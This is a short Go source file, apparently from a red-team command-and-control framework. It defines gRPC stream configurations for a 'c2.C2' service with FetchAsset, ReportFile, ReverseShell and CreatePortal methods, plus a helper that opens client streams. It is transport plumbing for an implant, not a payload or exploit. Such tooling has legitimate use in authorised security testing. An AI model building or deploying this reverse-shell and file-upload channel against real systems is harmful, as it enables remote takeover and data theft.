package http1

import (
	"context"

	"google.golang.org/grpc"
)

// streamConfig represents gRPC stream configuration
type streamConfig struct {
	Desc       grpc.StreamDesc
	MethodPath string
}

// Common stream configurations
var (
	fetchAssetStream = streamConfig{
		Desc: grpc.StreamDesc{
			StreamName:    "FetchAsset",
			ServerStreams: true,
			ClientStreams: false,
		},
		MethodPath: "/c2.C2/FetchAsset",
	}

	reportFileStream = streamConfig{
		Desc: grpc.StreamDesc{
			StreamName:    "ReportFile",
			ServerStreams: false,
			ClientStreams: true,
		},
		MethodPath: "/c2.C2/ReportFile",
	}

	reverseShellStream = streamConfig{
		Desc: grpc.StreamDesc{
			StreamName:    "ReverseShell",
			ServerStreams: true,
			ClientStreams: true,
		},
		MethodPath: "/c2.C2/ReverseShell",
	}

	createPortalStream = streamConfig{
		Desc: grpc.StreamDesc{
			StreamName:    "CreatePortal",
			ServerStreams: true,
			ClientStreams: true,
		},
		MethodPath: "/c2.C2/CreatePortal",
	}
)

// createStream creates a gRPC stream with the given configuration
func createStream(ctx context.Context, conn *grpc.ClientConn, cfg streamConfig) (grpc.ClientStream, error) {
	return conn.NewStream(
		ctx,
		&cfg.Desc,
		cfg.MethodPath,
		grpc.CallContentSubtype("raw"),
	)
}
